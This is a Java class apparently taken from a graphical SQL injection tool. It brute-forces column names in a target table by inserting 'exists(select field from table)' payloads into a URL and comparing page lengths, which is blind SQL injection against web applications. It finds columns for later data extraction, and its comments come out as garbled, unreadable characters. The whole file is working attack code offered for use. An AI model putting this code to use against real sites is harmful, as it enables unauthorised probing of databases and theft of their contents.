package com.sql;

import java.util.List;

import javax.swing.JButton;
import javax.swing.table.DefaultTableModel;

public class GetColumnName implements Runnable{
	private String url;
	private String urlHead;
	private String urlEnd;
	private List<String> column;
	private boolean flag=true;
	private JButton parseColumnBtn;
	private JButton parseValueBtn;
	private DefaultTableModel showColumn;
	private String tableName;
	private int contentLen;
	private List<String> columnName;
	public GetColumnName(String url,String urlHead,String urlEnd,JButton parseColumnBtn,JButton parseValueBtn,DefaultTableModel showColumn,List<String> column,String tableName,List<String> columnName) {
		// TODO Auto-generated constructor stub
		this.url=url;
		this.urlEnd=urlEnd;
		this.urlHead=urlHead;
		this.parseColumnBtn=parseColumnBtn;
		this.parseValueBtn=parseValueBtn;
		this.showColumn=showColumn;
		this.column=column;
		this.tableName=tableName;
		this.contentLen=IsExistInjection.getContent(this.url).length();
		this.columnName=columnName;
	}
	@Override
	public void run() {
		int i = 0;
//		List<String> columnName = new FileTools().getData("FieldName.txt");// ����һ���������洢�������ֵ��ж�ȡ�����ֶ����������ֵ���Դ�ڰ�D
		while(i<columnName.size()&&flag==true) {// �����ֵ��е�ÿһ���ֶ����Ƿ�����ڸñ���
			if (testColumnName(columnName.get(i), tableName)){
				column.add(columnName.get(i));// ����ǿգ��������ֶ����ڸñ��г��֣������ֶ�����ӵ�������
				Object[] obj={columnName.get(i)};
				showColumn.addRow(obj);
			}
			i++;
		}
		parseColumnBtn.setText("�������");
		if(!column.isEmpty())
			parseValueBtn.setEnabled(true);
	}
	public boolean testColumnName(String fieldName, String tableName) {// �����ֶ����Ƿ���ȷ
		/*
		 * �²��ֶ��� and exists(select �ֶ��� from ����) ֱ��������ȷҳ��
		 */
		String testUrl = urlHead + "exists(select%20" + fieldName
				+ "%20from%20" + tableName + ")" + urlEnd;
		try {
			if (IsExistInjection.isRightPage(this.contentLen, testUrl))
				return true;
			else
				return false;
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			return false;
		}
	}
	public void stop(){
		flag=false;
	}
}
